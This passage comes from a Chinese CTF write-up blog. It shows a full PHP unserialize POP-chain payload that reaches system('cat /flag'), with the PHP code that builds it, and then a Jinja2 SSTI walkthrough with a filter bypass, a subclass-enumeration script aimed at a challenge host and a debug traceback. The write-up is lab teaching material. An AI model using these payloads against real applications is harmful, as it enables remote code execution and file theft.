class="hljs-comment">//O:5:&quot;Begin&quot;:1:&#123;s:4:&quot;name&quot;;O:4:&quot;Then&quot;:1:&#123;s:10:&quot;Thenfunc&quot;;O:5:&quot;Super&quot;:1:&#123;s:6:&quot;*obj&quot;;O:6:&quot;Handle&quot;:1:&#123;s:6:&quot;*obj&quot;;O:3:&quot;CTF&quot;:1:&#123;s:6:&quot;handle&quot;;O:8:&quot;WhiteGod&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:9:&quot;cat /flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;</span><br><br></code></pre></td></tr></table></figure><p>注意：私有变量序列化后不光会在变量名前加上类名，而且还会在类名前后各加一个空白字符<code>%00</code>。<code>protected</code>属性倒不会在变量名前加类名，但他会先加一个<code>*</code>，然后在<code>*</code>之前分别加上<code>%00</code></p><p>所以要修改为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Begin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;name&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Then&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;%00Then%00func&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Super&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;%00*%00obj&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Handle&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;%00*%00obj&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;CTF&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;handle&quot;</span>;O<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;WhiteGod&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;func&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;system&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">3</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;var&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">9</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;cat /flag&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>然后<code>post</code>传<code>pop</code>就行了~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//其实如果都是public的话可以这样做，可能更好理解一些（不过私有属性只能在定义它们的类内部访问，而不能在类外部或子类中直接访问。）：</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br><span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br><span class="hljs-variable">$a</span> -&gt; name = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//类的实例被当字符串，调用tostring函数</span><br><span class="hljs-variable">$b</span> -&gt; func = <span class="hljs-variable">$c</span>;<span class="hljs-comment">//调用函数的方式调用类，触发__invoke函数</span><br><span class="hljs-variable">$c</span> -&gt; obj = <span class="hljs-variable">$d</span>;<span class="hljs-comment">//在对象中调用一个不可访问方法时触发__call函数</span><br><span class="hljs-variable">$d</span> -&gt; obj = <span class="hljs-variable">$e</span>;<span class="hljs-comment">//触发CTF类中的end()函数，调用unset</span><br><span class="hljs-variable">$e</span> -&gt; handle = <span class="hljs-variable">$f</span>;<br></code></pre></td></tr></table></figure><p>理解了上面这个链子的构造方法改一改再放进去就行,其实就是通过类内部提供的公共方法来间接访问私有属性，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$privateProperty</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setPrivateProperty</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;privateProperty = <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getPrivateProperty</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;privateProperty;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$example</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>();<br><span class="hljs-variable">$example</span>-&gt;<span class="hljs-title function_ invoke__">setPrivateProperty</span>(<span class="hljs-string">&quot;Hello, World!&quot;</span>); <span class="hljs-comment">// 通过公共方法间接访问私有属性</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$example</span>-&gt;<span class="hljs-title function_ invoke__">getPrivateProperty</span>(); <span class="hljs-comment">// 通过公共方法间接访问私有属性的值</span><br></code></pre></td></tr></table></figure><p>其实这题我看一些人的做法直接<code>urlencode</code>序列化结果就直接传过去了。。但是我的不成功。。不知道为啥:(</p><h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p><img src="/img/genshin1.png" alt="genshin1"></p><p><code>dirsearch</code>没扫出来啥，<code>bp</code>抓包发现这么个东西：</p><p><img src="/img/genshin4.png" alt="genshin4"></p><p><code>secr3tofpop</code>，访问就行</p><p><img src="/img/genshin2.png" alt="genshin2"></p><p><code>node4.buuoj.cn:81/secr3tofpop?name=1</code></p><p><img src="/img/genshin3.png" alt="genshin3"></p><p><code>name</code>的值会回显到页面上，猜测<code>SSTI</code>，先判断类型：</p><p><code>/secr3tofpop?name=$&#123;7*7&#125;</code>：</p><p><img src="/img/genshin5.png" alt="genshin5"></p><p><code>/secr3tofpop?name=&#123;&#123;7*7&#125;&#125;</code></p><p><img src="/img/genshin6.png" alt="genshin6"></p><p>经过测试单个<code>&#123;&#125;</code>没被过滤，但<code>&#123;&#123;&#125;&#125;</code>会被检测到。而且引号<code>&#39;&#39;</code>也被过滤了。</p><p>引号过滤我们可以使用数组<code>[]</code>或者直接<code>config</code>找他的爹，至于双括号被过滤，网上找了篇文章：</p><p><code>https://blog.csdn.net/weixin_73051164/article/details/132574970</code></p><p><code>?name=&#123;%%20print([].__class__.__base__.__subclasses__())%20%&#125;</code>:</p><p><code>/secr3tofpop?name=%7b%%20print([].__class__.__base__.__subclasses__())%20%%7D</code></p><p><img src="/img/genshin7.png" alt="genshin7"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    url = <span class="hljs-string">&quot;http://3ae9f2a4-38eb-4d14-9b46-74045fd576fb.node4.buuoj.cn:81/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;])%20%&#125;&quot;</span>  <br><br>    s = requests.get(url=url)<br>    time.sleep(<span class="hljs-number">0.06</span>)<br>    <span class="hljs-comment">#print(s.text)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">in</span> s.text:<br>        <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>这段代码运行的时候会出问题，比如：</p><p><img src="/img/genshin8.png" alt="genshin8"></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;frame&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;frame-139696630025344&quot;</span>&gt;</span></span><br><span class="language-xml">  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>File </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">cite</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;filename&quot;</span>&gt;</span>&quot;<span class="hljs-symbol">&amp;lt;</span>unknown<span class="hljs-symbol">&amp;gt;</span>&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">cite</span>&gt;</span></span><span class="language-xml">,</span><br><span class="language-xml">      line </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">em</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;line&quot;</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span></span><span class="language-xml">,</span><br><span class="language-xml">      in </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">code</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;function&quot;</span>&gt;</span>template<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;source &quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">blockquote</span>&gt;</span>jinja2.exceptions.TemplateSyntaxError: tag name expected</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">blockquote</span>&gt;</span></span><br>&lt;/div&gt;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;plain&quot;</span>&gt;</span></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">      This is the Copy/Paste friendly version of the traceback.</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;50&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;code&quot;</span> <span class="hljs-attr">readonly</span>&gt;</span>Traceback (most recent call last):</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 2213, in __call__</span><br><span class="language-xml">    return self.wsgi_app(environ, start_response)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 2193, in wsgi_app</span><br><span class="language-xml">    response = self.handle_exception(e)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 2190, in wsgi_app</span><br><span class="language-xml">    response = self.full_dispatch_request()</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 1486, in full_dispatch_request</span><br><span class="language-xml">    rv = self.handle_user_exception(e)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 1484, in full_dispatch_request</span><br><span class="language-xml">    rv = self.dispatch_request()</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/app.py<span class="hljs-symbol">&amp;#34;</span>, line 1469, in dispatch_request</span><br><span class="language-xml">    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/app/app.py<span class="hljs-symbol">&amp;#34;</span>, line 21, in hello</span><br><span class="language-xml">    return render_template_string(sign_in)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/flask/templating.py<span class="hljs-symbol">&amp;#34;</span>, line 162, in render_template_string</span><br><span class="language-xml">    template = app.jinja_env.from_string(source)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/jinja2/environment.py<span class="hljs-symbol">&amp;#34;</span>, line 1105, in from_string</span><br><span class="language-xml">    return cls.from_code(self, self.compile(source), gs, None)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/jinja2/environment.py<span class="hljs-symbol">&amp;#34;</span>, line 768, in compile</span><br><span class="language-xml">    self.handle_exception(source=source_hint)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span>/usr/local/lib/python3.8/site-packages/jinja2/environment.py<span class="hljs-symbol">&amp;#34;</span>, line 936, in handle_exception</span><br><span class="language-xml">    raise rewrite_traceback_stack(source=source)</span><br><span class="language-xml">  File <span class="hljs-symbol">&amp;#34;</span><span class="hljs-symbol">&amp;lt;</span>unknown<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;#34;</span>, line 2, in template</span><br><span class="language-xml">jinja2.exceptions.TemplateSyntaxError: tag name expected</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br>&lt;/div&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;explanation&quot;</span>&gt;</span></span><br><span class="language-xml">  The debugger caught an exception in your WSGI application.  You can now</span><br><span class="language-xml">  look at the traceback which led to the error.  </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nojavascript&quot;</span>&gt;</span></span><br><span class="language-xml">  If you enable JavaScript you can also use additional features such as code</span><br><span class="language-xml">  execution (if the evalex feature is enabled), automatic pasting of the</span><br><span class="language-xml">  exceptions and much more.<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;footer&quot;</span>&gt;</span></span><br><span class="language-xml">        Brought to you by </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;arthur&quot;</span>&gt;</span>DON&#x27;T PANIC<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span></span><span class="language-xml">, your</span><br><span class="language-xml">        friendly Werkzeug powered traceback interpreter.</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    &lt;/div&gt;<br><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pin-prompt&quot;</span>&gt;</span></span><br><span class="language-xml">      </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inner&quot;</span>&gt;</span></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Console Locked<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">          The console is locked and needs to be unlocked by entering the PIN.</span><br><span class="language-xml">          You can find the PIN printed out on the standard output of your</span><br><span class="language-xml">          shell that runs the server.</span><br><span class="language-xml">        </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml">          </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>PIN:</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">text</span> <span class="hljs-attr">name</span>=<span class="hljs-string">pin</span> <span class="hljs-attr">size</span>=<span class="hljs-string">14</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">btn</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Confirm Pin&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><br>&lt;!--<br><br>Traceback (most recent call<span class="hljs-built_in"> last</span>):<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">2213</span>, <span class="hljs-keyword">in</span> __call_<span class="hljs-number">_</span><br>    <span class="hljs-keyword">return</span> self.wsgi_app(environ, start_response)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">2193</span>, <span class="hljs-keyword">in</span> wsgi_app<br>    response = self.handle_exception(e)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">2190</span>, <span class="hljs-keyword">in</span> wsgi_app<br>    response = self.full_dispatch_request()<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">1486</span>, <span class="hljs-keyword">in</span> full_dispatch_request<br>    rv = self.handle_user_exception(e)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">1484</span>, <span class="hljs-keyword">in</span> full_dispatch_request<br>    rv = self.dispatch_request()<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">1469</span>, <span class="hljs-keyword">in</span> dispatch_request<br>    <span class="hljs-keyword">return</span> self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)<br>  File <span class="hljs-string">&quot;/app/app.py&quot;</span>, line <span class="hljs-number">21</span>, <span class="hljs-keyword">in</span> hello<br>    <span class="hljs-keyword">return</span> render_template_string(sign_in)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/templating.py&quot;</span>, line <span class="hljs-number">162</span>, <span class="hljs-keyword">in</span> render_template_string<br>    template = app.jinja_env.from_string(source)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/jinja2/environment.py&quot;</span>, line <span class="hljs-number">1105</span>, <span class="hljs-keyword">in</span> from_string<br>    <span class="hljs-keyword">return</span> cls.from_code(self, self.compile(source), gs, None)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/jinja2/environment.py&quot;</span>, line <span class="hljs-number">768</span>, <span class="hljs-keyword">in</span> compile<br>    self.handle_exception(source=source_hint)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/jinja2/environment.py&quot;</span>, line <span class="hljs-number">936</span>, <span class="hljs-keyword">in</span> handle_exception<br>    raise rewrite_traceback_stack(source=source)<br>  File <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>, line <span class="hljs-number">2</span>, <span class="hljs-keyword">in</span> template<br>jinja2.exceptions.TemplateSyntaxError: tag<span class="hljs-built_in"> name</span> expected<br><br><br>--&gt;<br></code></pre></td></tr></table></figure><p>一开始想了挺久不知道为啥出这个页面，后面注意到这里面有个<code>Debug</code>，很明显是我们的输入有问题，尝试访问：<code>/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[%22`就是加号之前的那部分，果然进入了`Debug`界面：![genshin9](img/genshin9.png)`payload`中的`+`被替换成空格了：`/secr3tofpop?name=++1++`![genshin10](img/genshin10.png)![genshin11](img/genshin11.png)这里可以找到部分和`waf`有关的代码，但`waf`具体是什么不知道。其实在`%7b%%20print([].__class__.__base__.__subclasses__())%20%%7D`界面是能搜索到带有`os`的模块的，总不能让我一个一个去数吧。。想了想写出个这个东西：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br>a = <span class="hljs-string">&quot;&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class 